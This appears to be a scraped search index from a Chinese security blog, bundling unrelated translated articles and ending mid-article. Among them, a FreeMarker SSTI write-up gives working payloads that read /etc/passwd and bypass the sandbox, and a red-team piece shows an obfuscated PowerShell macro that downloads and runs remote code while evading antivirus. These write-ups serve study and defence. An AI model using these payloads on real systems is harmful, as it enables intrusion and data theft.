TB明文的额外总开销：37个AES-256块，17个额外的AES-256密钥调度 AES-128-GEM：\n密钥派生：两个额外的AES加密块，一些XOR，一个额外的密钥调度 每236字节明文的额外密钥派生：一个额外的AES加密块，一个额外的密钥调度 认证：一个额外的AES加密块 密钥承诺：两个额外的AES加密块 1 GB明文的额外总开销：五个AES-128块，两个额外的AES-128密钥调度 1 TB明文的额外总开销：21个AES-128块，17个额外的AES-128密钥调度 其他想法 可能还有我们尚未想象的另一种选择。找到最佳权衡，特别是在考虑硬件设计时，是我们在NIST研讨会上展示GEM的原因之一。\n切割GEM\rIETF的CFRG目前正在讨论一种修改后的AES-GCM变体的RFC草案，称为GCM-SST，它对短标签是安全的。他们的设计出于性能原因使用POLYVAL而不是GHASH，并使用带有第二个POLYVAL的第二个认证密钥（Q），所有这些都进行XOR。\n不出所料，这种额外的XOR并不能显著保护AES-GCM中短标签的弱点（尽管它确实使通常的攻击更昂贵）。\n我们对GEM的初始设计使用AES块密码置换GHASH输出，而不是简单地在多项式输出中引入额外的线性操作（XOR）。\n我们有兴趣与其他行业领导者合作，提供一种强调短标签用例（即WebRTC）的GEM变体。这种假设的变体（暂定名为CUT-GEM）可以使用POLYVAL代替GHASH，并使用基于时期的子密钥派生计划来减少每个数据包的性能影响。\n在哪里可以了解更多关于AES-GEM的信息？\r有关AES-GEM的更多信息可在我们的GitHub上找到！\n","date":"2025-08-02T07:29:18+08:00","permalink":"http://localhost:1313/p/%E5%AE%A3%E5%B8%83aes-gem%E5%B8%A6%E4%BC%BD%E7%BD%97%E7%93%A6%E6%89%A9%E5%B1%95%E6%A8%A1%E5%BC%8F%E7%9A%84aes%E5%A2%9E%E5%BC%BAaes-gcm%E5%AE%89%E5%85%A8%E6%80%A7%E7%9A%84%E6%96%B0%E5%8A%A0%E5%AF%86%E6%A8%A1%E5%BC%8F/","title":"宣布AES-GEM（带伽罗瓦扩展模式的AES）——增强AES-GCM安全性的新加密模式"},{"content":"突破壁垒：FreeMarker模板引擎中的SSTI漏洞实现远程代码执行\r2023年，我在使用旧版FreeMarker模板引擎的应用中发现了一个重大漏洞。该版本存在服务器端模板注入(SSTI)漏洞，使我能够实现远程代码执行(RCE)。报告问题后，公司立即实施了沙箱机制来缓解SSTI攻击风险。但由于仍在使用FreeMarker 3.2.30以下版本，存在已知的沙箱绕过漏洞。本文将深入分析这一发现，重点展示绕过沙箱机制的具体步骤。\nFreeMarker模板引擎工作原理\rFreeMarker是一款广泛采用的模板引擎，主要用于Java应用中将表现逻辑与业务逻辑分离。它允许开发者创建包含静态内容和动态占位符的模板，这些模板可以通过Java对象或数据库查询等数据源填充，最终生成动态输出。\nHTML转PDF的工作流程如下：\nHTML结构定义：在FreeMarker模板文件中定义HTML结构，包括内容、格式和样式 FreeMarker指令：使用\u0026lt;#开头的指令动态填充数据，包括集合遍历、条件渲染和变量访问 指令块：在指令中定义可条件执行或循环的代码块 HTML渲染：将模板与数据合并生成最终HTML PDF转换：使用HTML转PDF工具将生成的HTML转为PDF文档 漏洞发现过程\r在应用测试阶段，我观察到\u0026lt;#if\u0026gt;、\u0026lt;#list\u0026gt;等标签的使用，确认应用使用了FreeMarker引擎。通过以下测试代码验证了引擎行为：\n1 2 \u0026lt;#assign test = .version\u0026gt; TEST FOR SSTI: ${3*3} 这些测试验证了引擎对特殊字符的处理、变量声明和基础运算能力。接着使用以下代码确认引擎版本：\n1 2 \u0026lt;#assign freemarkerVersion = .version\u0026gt; FreeMarker version: ${freemarkerVersion} 确认版本低于2.3.30，存在SSTI漏洞(CVE-2021-25770)。\n漏洞利用\rfreemarker.template.utility.Execute类允许在模板中执行外部命令。构造如下payload可读取/etc/passwd文件：\n1 ${\u0026#34;freemarker.template.utility.Execute\u0026#34;?new()(\u0026#34;cat /etc/passwd\u0026#34;)} 公司随后引入了沙箱环境作为防护措施。沙箱限制了模板引擎的操作能力，提供了安全执行环境。但旧版本仍存在绕过可能。\n沙箱绕过技术\r验证特殊字符处理和运算能力后，构建绕过payload：\n1 2 3 4 5 \u0026lt;#assign classloader=article.class.protectionDomain.classLoader\u0026gt; \u0026lt;#assign owc=classloader.loadClass(\u0026#34;freemarker.template.ObjectWrapper\u0026#34;)\u0026gt; \u0026lt;#assign dwf=owc.getField(\u0026#34;DEFAULT_WRAPPER\u0026#34;).get(null)\u0026gt; \u0026lt;#assign ec=classloader.loadClass(\u0026#34;freemarker.template.utility.Execute\u0026#34;)\u0026gt; ${dwf.newInstance(ec,null)(\u0026#34;cat /etc/passwd\u0026#34;)} 该payload通过反射获取类加载器，加载关键类并最终执行命令，成功绕过沙箱防护。\n","date":"2025-08-02T07:11:23+08:00","permalink":"http://localhost:1313/p/%E7%AA%81%E7%A0%B4%E5%A3%81%E5%9E%92freemarker%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E4%B8%AD%E7%9A%84ssti%E6%BC%8F%E6%B4%9E%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/","title":"突破壁垒：FreeMarker模板引擎中的SSTI漏洞实现远程代码执行"},{"content":"使用AFL模糊测试《反恐精英：全球攻势》地图文件\rRealWorldCTF 2018有一个非常有趣的挑战叫做\u0026quot;P90 Rush B\u0026quot;，这是对Valve游戏《反恐精英：全球攻势》中一种战术的影射。该挑战要求发现并利用CS:GO服务器使用的地图文件加载器中的漏洞。\n在CTF期间，我利用了一个栈缓冲区溢出漏洞，后来另一个团队在他们的报告中很好地描述了这个漏洞。由于这个漏洞也影响了官方的CS:GO Windows客户端，符合Valve的漏洞赏金计划条件，实际上它只是一个旧报告的小变种，所以我在CTF结束后很快报告了它，并迅速得到了修复。\nBSP文件格式与攻击面\rCS:GO（可能所有Source引擎游戏）使用的地图文件格式称为BSP，是二进制空间分割的缩写，这是一种方便的n维空间对象表示方法。然而，这种格式支持的远不止3D信息。BSP文件由服务器和客户端共同处理，因为两者都需要地图信息的某个子集来执行各自的任务。这是一个远程攻击面，因为客户端会在服务器发起的地图变更时从服务器下载未知地图。\n模糊测试设置\r为了简单起见，我决定模糊测试Linux服务器二进制文件，而不是实际的客户端（也可以在Linux上运行）。用这种方法显然无法发现客户端特有的问题，但我希望能找到共享代码中的低悬果实。\n我编写了一个简单的包装器来处理服务器二进制文件使用的共享库，最重要的几个是：\nengine.so - 主要Source引擎代码（包含BSP解析器） dedicated.so - 专用服务器实现（包含应用程序入口点） libtier0.so - 可能与Steam/应用程序管理相关 AFL修改\r我对AFL做了一些简单的修改：\n输入文件必须以.bsp结尾才能被GetModelForName正确解析 需要能够指定自定义的fork服务器启动点 增加等待fork时的超时乘数 漏洞分类与根因分析\r我们需要将\u0026quot;好\u0026quot;的漏洞与不感兴趣的漏洞（如纯越界读取）分开。我基于调用栈进行了简单的去重，然后在Valgrind中运行每个独特样本。\n经验总结\r从这个小型项目中我学到了：\nAFL在QEMU模式下非常灵活，可以攻击特定代码段 输入文件大小非常重要，从300KB降到16KB后性能至少提高了5倍 分类对于筛选以前未经过模糊测试的代码库非常重要 堆上的内存损坏不是一个安全问题 :) 示例漏洞：CVirtualTerrain::LevelInit中的堆缓冲区溢出\r在CVirtualTerrain::LevelInit中发生堆缓冲区溢出，因为dphysdisp_t::numDisplacements变量可能大于g_DispCollTreeCount，而检查这种情况的断言在发布版本中不存在。攻击者可以很大程度上控制堆内容，因此很可能被利用，特别是在Windows 7上许多模块没有启用ASLR的情况下。\n[附上一个BSP文件，其中numDisplacements = 0xffff且g_DispCollTreeCount = 2，可以可靠地使csgo.exe崩溃]\n","date":"2025-08-02T06:54:57+08:00","permalink":"http://localhost:1313/p/%E4%BD%BF%E7%94%A8afl%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E5%8F%8D%E6%81%90%E7%B2%BE%E8%8B%B1%E5%85%A8%E7%90%83%E6%94%BB%E5%8A%BF%E5%9C%B0%E5%9B%BE%E6%96%87%E4%BB%B6%E7%9A%84%E6%8A%80%E6%9C%AF%E5%AE%9E%E8%B7%B5/","title":"使用AFL模糊测试《反恐精英：全球攻势》地图文件的技术实践"},{"content":"点击启用内容 - 绕过杀毒检测的C2通信技术\r注意：本文所述技术可能已过时，但仍可作为学习现代工具技术演进的参考案例。\n在BHIS，绕过杀毒扫描已成为我们的\u0026quot;办公室运动\u0026quot;。在进行C2测试时，我们会从内网主机建立到C2服务器的反向连接，通过多种数据传递方式来测试防御系统的检测能力。我们的成功率很高（通常能成功外传数据），主要原因是恶意流量的识别极其困难——攻击者可以通过混淆技术使流量逃过杀毒软件和安全设备的检测。\n技术实现细节\r监听器配置\n在C2服务器设置443端口的反向TCP监听（选择443因其通常允许出站）。\n载荷生成\n使用Veil-Evasion工具生成混淆的PowerShell脚本载荷，该工具只需输入目标地址/端口及载荷类型即可自动生成代码。\n宏安全处理\n原始生成的2300字符单行脚本会触发VB编辑器报错。通过macro_safe.py脚本将长代码分割为VB可处理的片段：\n1 2 3 4 5 # macro_safe.py处理示例 # 将长命令拆分为多行连接字符串 str = \u0026#34;powershell -nop -w hidden -c \u0026#34; \u0026amp; _ \u0026#34;IEX ((new-object net.webclient).\u0026#34; \u0026amp; _ \u0026#34;downloadstring(\u0026#39;http://192.168.1.1/a\u0026#39;))\u0026#34; PPT宏植入\n将文档另存为.pps（97-2003格式）避免\u0026quot;m\u0026quot;扩展名引起怀疑 通过\u0026quot;开发工具\u0026quot;选项卡插入VB模块 使用\u0026quot;鼠标点击\u0026quot;动作触发宏执行（覆盖整个首幻灯片的文本框） 安全绕过实证\r测试扫描结果：\nGmail扫描器 ❌ 未检测 Windows Defender ❌ 未检测 McAfee ❌ 未检测 Symantec ❌ 未检测 唯一防护是PowerPoint的主动内容警告，但用户往往因\u0026quot;错误消息疲劳\u0026quot;而忽略。这种技术揭示了单纯依赖杀毒软件的黑名单机制和用户教育的重要性。\n\u0026ldquo;如果必须让用户做安全决策，就必须持续教育他们认识潜在危险。\u0026rdquo; —— BHIS团队\n","date":"2025-08-02T06:38:38+08:00","permalink":"http://localhost:1313/p/%E5%88%A9%E7%94%A8veil-evasion%E7%BB%95%E8%BF%87%E6%9D%80%E6%AF%92%E8%BD%AF%E4%BB%B6%E6%A3%80%E6%B5%8B%E7%9A%84c2%E9%80%9A%E4%BF%A1%E6%8A%80%E6%9C%AF/","title":"利用Veil-Evasion绕过杀毒软件检测的C2通信技术"},{"content":"粉碎动画系列第一部：经典卡通如何启发现代CSS\r浏览器厂商很快就在CSS中加入了运动功能。首先是简单的:hover伪类，随后是两种状态间的过渡动画。接着出现了通过@keyframes改变状态的能力，最近更是新增了与滚动位置联动的滚动驱动动画。\n即便有了这些增强功能，CSS动画仍然相对基础。这让我想起了小时候在电视上看到的汉纳-巴伯拉动画系列。\n低成本动画技术的启示\r这些动画短片缺乏真人电影或动画大片的预算，也远低于威廉·汉纳和约瑟夫·巴伯拉在米高梅制作《猫和老鼠》时的资源。这意味着动画师需要开发技术来克服成本限制和当时的技术局限。\n他们采用每秒更少的帧数和更少的画格。不是为每一帧使用不同的图像，而是将每幅画面重复多次。通过缩放和叠加额外元素来构建新场景，尽可能重复使用画格。他们保持角色身体基本静止，通过叠加眼睛、嘴巴和腿部来制造说话和走路的假象。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 @keyframes background-scroll { 0% { background-position: 2750px 0; } 100% { background-position: 0 0; } } div { overflow: hidden; width: 100vw; height: 540px; background-image: url(\u0026#34;...\u0026#34;); background-size: 2750px 540px; background-repeat: repeat-x; animation: background-scroll 5s linear infinite; } 现代CSS实现技巧\r汉纳-巴伯拉动画师开发的简单高效技术可以用CSS实现。现代布局工具允许网页开发者分层元素。可缩放矢量图形(SVG)可以包含多个帧，开发者不必依赖JavaScript，可以使用CSS改变元素的不透明度、位置和可见性。\n在为艾美奖得主游戏作曲家Mike Worth设计网站时，我运用了这些原则。他想要一个大胆的复古风格设计来展示他的作品。我在整个网站中使用CSS动画，为访客创造惊喜。\n1 2 3 4 5 6 7 8 9 10 11 12 13 @keyframes bumpy-ride { 0% { translate: 0 0; } 10% { translate: 0 -5px; } 20% { translate: 0 3px; } 30% { translate: 0 -3px; } 40% { translate: 0 5px; } 50% { translate: 0 -10px; } 60% { translate: 0 4px; } 70% { translate: 0 -2px; } 80% { translate: 0 7px; } 90% { translate: 0 -4px; } 100% { translate: 0 0; } } SVG动画技巧\rSVG提供了惊人的性能和灵活性。通过CSS操作组和其他元素的能力，使其成为动画的理想选择。\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;svg\u0026gt; \u0026lt;!-- 静态元素 --\u0026gt; \u0026lt;g\u0026gt;...\u0026lt;/g\u0026gt; \u0026lt;!-- 动画帧 --\u0026gt; \u0026lt;g class=\u0026#34;frame-1\u0026#34;\u0026gt;...\u0026lt;/g\u0026gt; \u0026lt;g class=\u0026#34;frame-2\u0026#34;\u0026gt;...\u0026lt;/g\u0026gt; \u0026lt;g class=\u0026#34;frame-3\u0026#34;\u0026gt;...\u0026lt;/g\u0026gt; \u0026lt;g class=\u0026#34;frame-4\u0026#34;\u0026gt;...\u0026lt;/g\u0026gt; \u0026lt;g class=\u0026#34;frame-5\u0026#34;\u0026gt;...\u0026lt;/g\u0026gt; \u0026lt;g class=\u0026#34;frame-6\u0026#34;\u0026gt;...\u0026lt;/g\u0026gt; \u0026lt;/svg\u0026gt; 1 2 3 4 5 6 7 8 9 10 @keyframes ranger-talking { 0% { visibility: visible; } 16.67% { visibility: hidden; } 100% { visibility: hidden; } } [class*=\u0026#34;frame\u0026#34;] { visibility: hidden; animation: ranger-talking var(--animation-duration) infinite; } 动画的实用价值\r动画不仅仅是装饰，它们可以：\n通过引导用户操作改善可用性 在交互时带来愉悦和惊喜 强化品牌形象 帮助讲述品牌故事 在为Mike Worth设计的404页面中，当用户迷路时，他的吉祥物会慢慢陷入流沙，同时气泡上升，创造出一个既有趣又能反映品牌个性的体验。\n1 2 3 4 5 6 7 8 9 10 11 12 @keyframes four-oh-dear-bubbles { 0% { animation-timing-function: ease-in; opacity: 1; transform: translateY(45px); } 100% { animation-timing-function: ease-out; opacity: 1; translate: 0 0; } } 无障碍考虑\r不是所有人都以相同方式体验动画。有些人可能会感到不适甚至诱发癫痫。我们可以通过prefers-reduced-motion媒体查询来关闭动画：\n1 2 3 @media (prefers-reduced-motion: reduce) { * { animation: none !important; } } 就像汉纳-巴伯拉的动画师将技术限制转化为他们的标志性风格一样，CSS动画让网页专业人士能够打造富有特色的体验。通过分层元素、循环帧和应用细微运动，你可以在设计中注入个性，同时提升用户体验。\n","date":"2025-08-02T06:22:18+08:00","permalink":"http://localhost:1313/p/%E7%BB%8F%E5%85%B8%E5%8D%A1%E9%80%9A%E5%A6%82%E4%BD%95%E5%90%AF%E5%8F%91%E7%8E%B0%E4%BB%A3css%E5%8A%A8%E7%94%BB%E6%8A%80%E6%9C%AF/","title":"经典卡通如何启发现代CSS动画技术"},{"content":"移动出行服务中的实时欺诈检测：Kafka与Flink技术实践\r移动出行服务（如Uber、Grab、FREE NOW和DoorDash）建立在实时数据基础之上。每次行程、配送和支付都依赖精准的即时决策。但随着业务规模扩大，这些服务成为复杂欺诈的主要目标——GPS欺骗、虚假账户、支付滥用等。传统的批量欺诈检测方式因响应延迟、模式识别不足会产生安全盲区。领先平台正在采用Apache Kafka和Apache Flink构建实时事件处理系统，在欺诈发生瞬间进行拦截。\n移动出行服务的商业挑战\r现代城市生活中，网约车、外卖配送、共享单车等移动服务已成为基础设施。这些平台连接数百万用户、司机和商户，但同时也面临以下典型欺诈：\n虚假行程与GPS欺骗：司机伪造GPS数据模拟未发生的行程 支付欺诈与盗刷信用卡：使用盗取的支付方式叫车/订餐 虚假司机/乘客账户：同一人操控多账户套取平台补贴 促销滥用：通过海量虚假账号薅取推荐奖励 账户劫持：黑客盗用合法账户的支付信息 传统反欺诈系统的局限性\r基于批处理和规则引擎的传统方案存在四大缺陷：\n无法实现交易前的实时拦截 难以处理每秒百万级的事件吞吐 静态规则难以应对快速演变的欺诈模式 难以跨混合云环境部署 Kafka+Flink实时反欺诈架构\rApache Kafka：事件流处理核心\r实时采集GPS定位、支付交易、用户行为等数据 支持每秒百万事件处理能力 提供跨云环境的24/7高可用服务 Apache Flink：实时流分析引擎\r异常检测：识别GPS轨迹突变等空间异常 多流关联：实时聚合支付事件、位置更新等数据 在线机器学习：动态更新欺诈识别模型 毫秒级评分：在交易完成前生成风险评分 行业实践案例\rFREE NOW（Lyft）实时行程欺诈检测\r使用Kafka Streams分析150+欧洲城市的GPS数据 通过路线异常识别虚假行程 在Confluent Cloud上实现全托管流处理 GrabDefence反欺诈系统\r基于Kafka+Flink的实时风险评分 设备指纹+支付行为多维分析 将欺诈率从1.6%降至0.2% Uber RADAR项目\rKafka+Spark混合处理架构 机器学习识别拒付欺诈 引入人工审核闭环机制 技术实施关键点\r事件时间处理：正确处理乱序到达的移动端事件 状态管理：维护用户行为基线用于异常比对 模型部署：TensorFlow/PyTorch模型嵌入Flink流水线 动态规则更新：通过Kafka主题实时推送新规则 实时反欺诈已成为移动出行平台的核心竞争力。通过Kafka和Flink构建的流式处理架构，企业能够在损失发生前拦截99%的欺诈行为，同时将运营成本降低40%以上。\n","date":"2025-08-02T06:05:44+08:00","permalink":"http://localhost:1313/p/%E5%9F%BA%E4%BA%8Ekafka%E5%92%8Cflink%E7%9A%84%E7%A7%BB%E5%8A%A8%E5%87%BA%E8%A1%8C%E6%9C%8D%E5%8A%A1%E5%AE%9E%E6%97%B6%E6%AC%BA%E8%AF%88%E6%A3%80%E6%B5%8B%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/","title":"基于Kafka和Flink的移动出行服务实时欺诈检测技术解析"},{"content":"Warning to ServiceNow admins: Fix your access control lists now\r安全厂商警告称，ServiceNow管理用户访问控制列表(ACL)的方式存在漏洞，攻击者可轻松窃取敏感数据。研究人员敦促管理员立即检查自定义和标准数据配置表以加强安全防护。\nVaronis研究人员一年前就向ServiceNow报告了这个漏洞，使其能够悄悄修补平台并在5月向客户发布安全更新。随着ServiceNow本周发布通用漏洞披露(CVE-2025-3648)，Varonis公开了漏洞细节。\nIDC总裁Crawford Del Prete表示：\u0026ldquo;ServiceNow的更新修复了可能允许低权限用户访问受限数据的漏洞。考虑到ServiceNow处理的数据类型，这种情况总是可能很严重。\u0026rdquo;\nForrester Research企业架构首席分析师Charles Betz称这是\u0026quot;相当严重的漏洞\u0026quot;，敦促管理员\u0026quot;立即采取行动\u0026quot;。他指出：\u0026ldquo;随着CVE公开，攻击者很可能开始针对这些数据。\u0026rdquo;\n漏洞技术细节\r该访问控制漏洞允许未经认证或已认证用户在某些条件下通过查询请求访问未授权数据。Varonis安全研究经理Yogev Madar指出，攻击者可以利用以下方式实施攻击：\n仅依赖数据或脚本条件的ACL可能被滥用 未使用新的\u0026quot;Deny else\u0026quot;ACL机制 未应用Query ACL规则限制查询操作符 ServiceNow已在Xanadu和Yokohama平台版本中引入额外的访问控制列表框架。Varonis在博客中表示：\u0026ldquo;该漏洞相对容易利用，只需要最小的表访问权限，如实例中的弱用户账户甚至自注册匿名用户。\u0026rdquo;\n数据存储架构风险\rServiceNow将所有信息组织到表中，包括事件、请求、实例属性、用户数据、应用凭证等。这些表通过引用字段相互关联，而访问主要通过ACL规则控制。一个ServiceNow实例可能包含数万个ACL规则。\nACL规则包含四个访问条件，按以下顺序评估：\n必需角色 安全属性条件 数据条件 脚本条件 Varonis发现，如果访问因前两个条件被拒绝，系统会完全拒绝访问；但如果因数据或脚本条件被拒，用户仍能看到查询返回的记录总数，攻击者可利用查询参数通过枚举推断详细数据。\n修复建议\rServiceNow提供了新的ACL规则供管理员实施：\nQuery ACL：限制用户可执行的查询 新的安全数据过滤器：基于角色或安全属性限制记录访问 Reco首席产品官Gal Nakash强调：\u0026ldquo;这提醒我们即使成熟平台在访问控制方面也可能存在危险盲点。组织必须采用\u0026rsquo;最小权限\u0026rsquo;原则配置ACL，绝不能让角色和安全属性留空或过于宽泛。\u0026rdquo;\n","date":"2025-08-02T05:44:03+08:00","permalink":"http://localhost:1313/p/servicenow%E7%AE%A1%E7%90%86%E5%91%98%E6%B3%A8%E6%84%8F%E7%AB%8B%E5%8D%B3%E4%BF%AE%E5%A4%8D%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E5%88%97%E8%A1%A8%E6%BC%8F%E6%B4%9E/","title":"ServiceNow管理员注意：立即修复访问控制列表漏洞"},{"content":"今天我们将以\u0026quot;Max Power\u0026quot;方式配置云基础设施：将自动化与未经检查的AI输出相结合。不幸的是，这种方法产生的云基础设施代码虽然能用，但具有可怕的安全特性。\n简而言之，像Claude和ChatGPT这样的AI工具会轻易提供极其糟糕的云基础设施配置代码，比如使用常见硬编码密码的代码。这些工具还会\u0026quot;热心\u0026quot;地建议你使用\u0026quot;随机\u0026quot;密码，但由于LLM生成输出的本质，这些密码根本谈不上随机。即使你试图聪明地要求这些工具提供密码生成代码，这些代码也充满严重的安全漏洞。\n显然，不要盲目信任AI工具的输出。云服务提供商应该努力识别本文中提到的不良模式（和硬编码凭证），并在基础设施层进行拦截（就像他们在GitHub提交API密钥时做的那样）。LLM供应商应该考虑让生成存在明显安全问题的云基础设施代码变得不那么容易。\n创建一个Windows VM\r假设你是云开发新手。你想在Microsoft Azure上用Terraform创建一个Windows VM，并通过RDP连接到机器。（我们使用Azure作为示例只是因为这是我需要使用的提供商，但基本问题适用于所有云提供商）。\n让我们问问ChatGPT 4o和Claude应该怎么做。\n以下是ChatGPT的回答： [示例对话内容\u0026hellip;]\nClaude至少提醒你更改admin_password。这些都是硬编码凭证，使用它们很糟糕。是的，Claude要求你更改它们，但有多少人真的会这么做？应该相当容易设计正确的提示并提取出ChatGPT或Claude会输出的所有（技术上，几乎所有）凭证。\n要求更好的凭证\r我们都知道硬编码凭证不好。如果我们要求一些更好的呢？\n我们从ChatGPT开始： [示例对话内容显示生成的\u0026quot;随机\u0026quot;密码实际上并不随机\u0026hellip;]\n接下来试试Claude。起初它给出了正确的答案。但当被稍微不同地询问时，Claude很快就放弃了。\n关于密码生成\r也许我们可以要求这些工具编写生成密码的代码。事实上，我需要完成的部分任务涉及创建多个Azure AD账户，这似乎是个合乎逻辑的方法。看看我们的AI工具在自动生成账户凭证方面表现如何。\n以下是ChatGPT的解决方案： [展示有安全缺陷的Python随机模块代码\u0026hellip;]\nClaude的解决方案： [同样展示不安全的伪随机生成代码\u0026hellip;]\n这两个解决方案都非常具有欺骗性，因为它们看起来正确但实际上错得离谱。它们会生成\u0026quot;看起来\u0026quot;随机的密码，但存在缺陷：Python的random模块不是安全的随机数据源。它是一个用当前系统时间作为种子的伪随机生成器。很容易就能生成这个脚本在过去一年或更长时间内可能生成的所有密码。它提供的密码不应该用于任何用途，也许除了临时测试。正确的做法是使用Python的secrets模块。\n可以采取的措施\r毫无疑问，这个兔子洞很深。这里的回应只是我在几天内尝试自动化Terraform工作流程时遇到的。可悲的是，最不可能理解硬编码凭证和弱随机值影响的人，也最有可能直接复制粘贴AI工具的原始输出。\n云提供商应该假设人们已经在复制粘贴ChatGPT和Claude的输出，并应该努力拦截常见的硬编码凭证和其他不良基础设施模式。\nLLM供应商应该让用户更难意外地伤害自己。不应该是完全不可能出现这种行为，但绝对不应该是默认行为。\n一如既往，云基础设施很复杂；如果你真的想增强安全性，考虑让我们进行基础设施威胁模型评估，这将识别弱点和潜在攻击路径，并提出解决方法。在你庞大的自动化基础设施部署中，潜伏着比硬编码凭证和弱随机性更多的问题。\n","date":"2025-08-02T05:27:39+08:00","permalink":"http://localhost:1313/p/%E9%94%99%E8%AF%AF%E4%BD%86%E5%BF%AB%E9%80%9F%E7%9A%84%E4%BA%91%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E9%85%8D%E7%BD%AE%E6%96%B9%E5%BC%8F-%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9%E8%AD%A6%E7%A4%BA/","title":"错误但快速的云基础设施配置方式 - 安全风险警示"},{"content":"Homebrew构建溯源初探\r去年11月，我们宣布与Alpha-Omega、OpenSSF合作，为Homebrew添加构建溯源功能。现在，我们很高兴地宣布核心功能已进入公测阶段：homebrew-core现对所有官方CI构建的bottle（预编译二进制包）提供密码学证明。用户可通过我们开发的brew verify命令（当前为第三方插件，即将合并到上游）进行验证：\n1 2 brew tap trailofbits/homebrew-brew-verify brew verify \u0026lt;package\u0026gt; 技术实现原理\r构建身份绑定\n每个bottle现在附带可验证的声明，将其内容与构建工作流元数据（包括Git提交哈希、GitHub Actions运行ID等）进行密码学绑定，形成符合SLSA Build L2标准的证明。\n防御供应链攻击\n该机制可防止两种威胁场景：\n攻击者直接上传恶意构建到bottle存储库 维护者同时替换bottle及其校验值的\u0026quot;沉默攻击\u0026quot; 历史包回填方案\n针对旧版本bottle的兼容性问题，我们创新性地采用双验证策略：\n优先检查主仓库（Homebrew/homebrew-core）的正式构建证明 若不存在，则检查由trailofbits/homebrew-brew-verify提供的回填签名 设置截止日期防止签名滥用 验证工具使用\r当前提供两种实验性验证方式：\n1 2 3 4 5 6 7 8 # 方式1：独立验证命令 brew update brew tap trailofbits/homebrew-brew-verify brew verify bash # 方式2：安装时自动验证 export HOMEBREW_VERIFY_ATTESTATIONS=1 brew install cowsay 技术架构细节\r底层依赖\n基于GitHub的构件证明新特性（artifact attestations），包括：\ngenerate-build-provenance Action gh attestation CLI工具 元数据结构\n采用in-toto声明格式封装以下元数据：\nGitHub仓库及所有者信息 触发工作流的分支/事件 构建时的精确git commit 未来规划\n将验证工具上游化到brew核心 开发纯Ruby验证器替代gh CLI依赖 扩展支持第三方tap仓库的构建证明 安全边界说明\r构建证明虽不能防御以下场景：\n软件本身的恶意代码 应用层的降级攻击 但能显著提升供应链透明度： 强制攻击行为公开化 减少攻击者可利用的隐蔽转换环节 有效应对类似xz-utils后门的分发篡改攻击 ","date":"2025-08-02T05:11:16+08:00","permalink":"http://localhost:1313/p/homebrew%E6%9E%84%E5%BB%BA%E6%BA%AF%E6%BA%90%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90%E6%8F%90%E5%8D%87%E8%BD%AF%E4%BB%B6%E4%BE%9B%E5%BA%94%E9%93%BE%E5%AE%89%E5%85%A8/","title":"Homebrew构建溯源技术解析：提升软件供应链安全"},{"content":"Webcast: Burp Suite入门与Web应用渗透测试\r你是否负责Web应用的安全工作？是否好奇渗透测试人员如何发现其中的漏洞？\nBurp Suite是众多Web应用渗透测试者和漏洞赏金猎人的首选工具。虽然入门简单，但其部分高级功能却难以快速掌握。如果你曾观摩他人使用Burp，定能从中获益——每位专家都有独到的使用技巧。\n在这段Black Hills信息安全团队(BHIS)的直播教学中，BB King将演示：\n环境配置：针对Web应用和API测试的Burp初始化设置（0:32:33） 核心功能：全工具链快速导览（0:45:25） 效率提升：推荐配置、BApp商店扩展及实战技巧（1:22:08） 无论你是安全工程师、开发人员还是IT管理者，本教程都能帮助你更高效地使用Burp Suite进行安全评估。\n资源索引\r演示大纲下载 Awesome Burp扩展合集 FoxyProxy火狐插件 PortSwigger官网 特别提示：本课程包含Innocent Lives基金会公益宣传环节，支持儿童网络安全保护事业。\n","date":"2025-08-02T04:49:48+08:00","permalink":"http://localhost:1313/p/burp-suite%E5%85%A5%E9%97%A8%E4%B8%8Eweb%E5%BA%94%E7%94%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97/","title":"Burp Suite入门与Web应用渗透测试实战指南"},{"content":"引言\r本文记录了从未接触过浏览器漏洞利用的开发人员针对SpiderMonkey JavaScript Shell解释器和Mozilla Firefox（在Windows 10 RS5 64位系统上）开发三个漏洞利用的过程。近年来，浏览器利用引起了广泛关注，几乎每个主要CTF比赛都包含浏览器挑战，每月都有相关技术文章发布。\n我选择了Firefox的SpiderMonkey JavaScript引擎及其zn13编写的Blazefox挑战作为研究对象。本文展示了在这次探索中的发现和编写的三个漏洞利用：\nbasic.js：针对特定JavaScript解释器构建的漏洞利用，包含大量硬编码偏移 kaizen.js：改进版本，动态解析各种信息并使用基线JIT生成ROP gadget ifrit.js：最终针对Firefox浏览器的漏洞利用，利用JIT编译整个原生代码payload 环境设置\r首先需要设置调试环境，建议在虚拟机中进行。获取Mozilla的代码仓库（使用Git镜像）：\n1 git clone --depth 1 https://github.com/mozilla/gecko-dev.git 应用漏洞补丁文件blaze.patch后，安装Mozilla-Build工具链并配置x64调试构建：\n1 2 3 4 5 autoconf-2.13 mkdir build.asserts cd build.asserts ../configure --host=x86_64-pc-mingw32 --target=x86_64-pc-mingw32 --enable-debug mozmake -j2 SpiderMonkey内部机制\rJS::Values和JSObjects\rSpiderMonkey使用JS::Value作为JavaScript值的内部表示，其中高17位（JSVAL_TAG）用于编码类型信息，低47位（payload_）存储实际值或对象指针。\nJavaScript对象在内存中的布局：\n原生对象（NativeObject）包含shapeOrExpando_指针（描述对象属性）和存储元素/属性值的空间 数组对象（ArrayObject）继承自NativeObject，使用ObjectElements存储长度等信息 形状（Shapes）\r形状对象描述对象的属性，可以看作是一个哈希表，其中键是属性名，值是该属性值存储的槽位号。形状对象通过parent字段链接在一起形成属性链。\n漏洞利用开发\r漏洞分析\r漏洞源于添加的array_blaze方法，该方法将数组内部大小字段修改为420，从而允许越界访问：\n1 2 3 4 blz = [] blz.length // 0 blz.blaze() == undefined // false blz.length // 420 basic.js漏洞利用\r构建内存访问原语：通过相邻数组和TypedArray，将有限的内存读写转换为任意内存访问 对象地址泄露原语：通过操作相邻对象的属性存储槽位泄露对象地址 控制流劫持：覆盖js::Class的cOps函数指针 